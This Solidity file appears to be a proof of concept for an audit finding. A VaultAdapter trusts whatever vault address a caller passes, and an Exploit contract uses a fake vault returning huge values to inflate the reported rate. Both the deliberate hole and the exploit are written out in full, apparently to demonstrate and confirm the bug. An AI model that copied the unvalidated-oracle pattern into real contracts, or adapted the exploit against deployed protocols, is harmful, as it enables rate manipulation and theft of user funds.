// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVaultRate {
    function currentUtilizationIndex(address asset) external view returns (uint256);
    function utilization(address asset) external view returns (uint256);
}

contract MaliciousVault is IVaultRate {
    function currentUtilizationIndex(address) external pure returns (uint256) {
        return 1_000_000 ether;
    }

    function utilization(address) external pure returns (uint256) {
        return 1_000_000 ether;
    }
}

contract VaultAdapter {
    uint256 public lastIndex;
    uint256 public lastUpdate;
    uint256 public utilizationMultiplier = 1e18;

    function rate(address _vault, address _asset) external returns (uint256 latestAnswer) {
        uint256 elapsed;
        uint256 utilization;
        if (block.timestamp > lastUpdate) {
            uint256 index = IVaultRate(_vault).currentUtilizationIndex(_asset);
            elapsed = block.timestamp - lastUpdate;
            if (elapsed != block.timestamp) {
                utilization = (index - lastIndex) / elapsed;
            } else {
                utilization = IVaultRate(_vault).utilization(_asset);
            }
            lastIndex = index;
            lastUpdate = block.timestamp;
        } else {
            utilization = IVaultRate(_vault).utilization(_asset);
        }
        // @> VULN: the caller-supplied _vault is never validated against an allowlist.
        latestAnswer = utilization * utilizationMultiplier / 1e18;
    }
}

contract Exploit {
    VaultAdapter public adapter;
    MaliciousVault public malicious;
    uint256 public observedRate;
    bool public confirmed;

    constructor() {
        adapter = new VaultAdapter();
        malicious = new MaliciousVault();
    }

    function run() external {
        observedRate = adapter.rate(address(malicious), address(0xCAFE));
        require(observedRate > 1e18, "malicious vault did not inflate rate");
        require(adapter.lastIndex() == 1_000_000 ether, "crafted index not recorded");
        confirmed = true;
    }
}

